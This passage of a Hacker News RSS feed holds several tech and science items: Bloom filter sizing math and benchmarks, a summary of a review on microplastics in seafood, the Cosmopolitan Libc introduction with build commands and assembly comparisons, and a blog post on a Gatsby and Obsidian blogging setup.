<p>\begin{align}
    \frac{dg}{dk}\ =&amp; \ \ln \left(1-e^{-\frac{nk}{m}}\right)+\frac{kn \cdot e^{-\frac{nk}{m}}}{m\left(1-e^{-\frac{nk}{m}}\right)}.
\end{align}</p>

<p>Solving this derivative when it is 0 and finding the global minimum gives us</p>

<p>\begin{align}
    k = \frac{m}{n}\ln\pbrac{2}.
\end{align}</p>

<h3 id="optimal-m">Optimal <em>m</em></h3>
<p>To find an optimal length for our bit-array we substitute $k = \frac{m}{n}\ln\pbrac{2}$ into our false positive equation and get</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-e^{-\ln 2}}^{\frac{m}{n}\ln 2} \\
    \ln\epsilon \ =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln\pbrac{1-e^{-\ln 2}} \\
    =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln{\frac{1}{2}} \\
    =&amp; \ -\frac{m}{n}\ln\pbrac{2}^2 \\
    \therefore m \ =&amp; \ \frac{-n\ln\epsilon}{\ln\pbrac{2}^2}.
\end{align}\]

</p><p>This effectively leaves $\epsilon$ as the only unknown variable left. However, when we consider the Bloom filter in a practical context, we will most likely have a false positive rate in mind, and can treat it as a constant.</p>



<h2 id="implementation-and-benchmarks">Implementation and benchmarks</h2>

<h3 id="overview">Overview</h3>
<p>We will be comparing the Bloom filter against 4 popular and efficient implementations of hash tables:</p>

<ul>
  <li>Google Dense Hash Set</li>
  <li>Google Sparse Hash Set</li>
  <li>TSL Robin Set</li>
  <li>STD Unordered Set</li>
</ul>

<p>Implementations were compared based on time performance (insert, read) and memory performance (inserts). Currently, only small strings (15 characters) and medium strings (50 characters) are used for input, with up to $n = 3\times10^6$ elements for each test. Each test was performed 5 times for each implementation and an average-of-5 was used in the final table/graph. The false positive rate is set to 0.01.</p>

<p>Benchmarking was done using gccâ€™s C++ compiler and the following command was run to compile: g++ -Iinclude -std=c++11 -O3. In addition, the tests were performed on a computer with the following specs:</p>

<ul>
  <li>AMD Ryzen 5 2600 3.4GHz 6 core</li>
  <li>8GB DDR4-2666 CL19</li>
</ul>

<p>The tests were run with the false positive rate $\epsilon = 0.01$</p>



<h3 id="insert-small-string-15-bytes">Insert small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and then insert each string as an entry into the sets, measuring the performance of said insert operation. The Bloom filterâ€™s only overhead during insertion is setting bits to 1.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/insert_small_string.png" width="700"></p>



<h3 id="read-small-string-15-bytes">Read small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and pre-load the strings into the hash tables. We then traverse the same vector of small strings, testing set membership and timing said read operation.</p>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://andybui01.github.io/bloom-filter/">http://andybui01.github.io/bloom-filter/</a></em></p>]]>
            </description>
            <link>http://andybui01.github.io/bloom-filter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556713</guid>
            <pubDate>Mon, 28 Dec 2020 04:35:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study Demonstrates Seafood Contains the Heaviest Amount of Microplastics]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25556589">thread link</a>) | @voldemort1968
<br/>
December 27, 2020 | https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/ | <a href="https://web.archive.org/web/*/https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>In a review <a href="https://ehp.niehs.nih.gov/doi/full/10.1289/EHP7171">published in Environmental Health Perspectives</a>, Microplastics (MPs) are laid out as a serious problem in the marine environment as well as human food consumption.</p><p>The study analyzed 69 experiments across mollusks, crustaceans, fish and echinodermata. The data show that seafood is a major cause of human exposure to MPs. Levels of MP contamination vary significantly in different phylum of organisms. </p><p>Microplastics are tiny pieces of any kind of plastic found in the environment less than 5mm long according to NOAA and the European Chemicals Agency. They often end up in nature from cosmetics, clothing, and industrial processes.</p><figure><img src="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Plastic (PET) bottles collected from the river Tisza. They are ready to be transported and recycled." srcset="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@mihaly_koles?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Mihály Köles</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Two classifications of microplastics exist. Primary microplastics are smaller than 5mm. Polyester, nylon, and rayon fibers are also present (also known as nurdles). Secondary microplastics come from the micro degradation of larger plastic particles after their entrance into the environment through natural weathering processes.</p><p>"No-one yet fully understands the full impact of microplastics on the human body, but early evidence from other studies suggest they do cause harm." said study author, Evangelos Danopoulos, a postgraduate student at Hull York Medical School in an <a href="https://www.sciencedaily.com/releases/2020/12/201223091547.htm">article from Science Daily</a>.</p><p>"A critical step in understanding the full impact on human consumption is in first fully establishing what levels of microplastics humans are ingesting. We can start to do this by looking at how much seafood and fish is eaten and measuring the amount of MPs in these creatures."</p><figure><img src="https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 600w, https://smosa.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1000w, https://smosa.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1600w, https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1962w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://pubs.acs.org/doi/abs/10.1021/acs.est.9b01517">American Chemical Society; Expert(s) (Cox et al)</a></figcaption></figure><p>The study concludes that there needs to be harmonization and standardization of methods and procedures.</p><!--kg-card-begin: html--><p><a href="https://twitter.com/smosadotcom?ref_src=twsrc%5Etfw" data-show-count="false">Follow @smosadotcom</a></p><!--kg-card-end: html-->
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556589</guid>
            <pubDate>Mon, 28 Dec 2020 04:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan Libc: build-once run-anywhere C library]]>
            </title>
            <description>
<![CDATA[
Score 589 | Comments 162 (<a href="https://news.ycombinator.com/item?id=25556286">thread link</a>) | @pantalaimon
<br/>
December 27, 2020 | https://justine.lol/cosmopolitan/index.html | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">» jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Buzzword.engineering Tech Stack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25556272">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | https://buzzword.engineering/post/blog-tech-stack | <a href="https://web.archive.org/web/*/https://buzzword.engineering/post/blog-tech-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span><strong>Spoiler Alert</strong></h5></p><p>It was, in fact, possible.</p></div>
<p>Anyway, here's Buzzword Engineering's inaugural blog post. If you like it, go give me a github star on the <a href="https://github.com/steven-terrana/steven-terrana.github.io" target="_blank" rel="nofollow noopener noreferrer">blog repo</a> or something. It's a nice dopamine boost and fuels my self-worth. </p>

<p>Let's dive in. Here's a digram for those visual learners out there. </p>
<p><span>
      <a href="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ac56/overview.webp 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d3be9/overview.webp 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e46b2/overview.webp 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e97dc/overview.webp 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ff5a/overview.png 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e85cb/overview.png 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png" alt="This diagram shows an overview of buzzword.engineering tech stack and associated automation" title="This diagram shows an overview of buzzword.engineering tech stack and associated automation" loading="lazy">
      </picture>
  </a>
    </span></p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>Excalidraw is Dope</strong></h5></p><p>If you haven't heard of it, stop reading this and go play with <a href="https://excalidraw.com/" target="_blank" rel="nofollow noopener noreferrer">Excalidraw</a> and then come back. It's the tool I used to sketch out this diagram.</p></div>
<h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2>
<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>
</ol>
<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>using local vault path: </span><span><span>${</span>siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>}</span></span><span>`</span></span><span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span>'gatsby-source-filesystem'</span><span>,</span>
    options<span>:</span> <span>{</span>
      path<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>,</span>
      name<span>:</span> <span>'local_obsidian'</span><span>,</span>
      ignore<span>:</span> <span>[</span> <span>"**/.git/**/*"</span><span>,</span> <span>"**/.obsidian/**/*"</span><span>,</span> <span>"**/Templates/**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span> <span>else</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>"fetching from remote repo: "</span><span>,</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span><span>`</span><span>gatsby-source-git</span><span>`</span></span><span>,</span>
    options<span>:</span> <span>{</span>
      name<span>:</span> <span><span>`</span><span>obsidian</span><span>`</span></span><span>,</span>
      remote<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>,</span>
      patterns<span>:</span> <span>[</span> <span>"!**/Templates/**/*"</span><span>,</span> <span>"**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span></code></pre></div>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
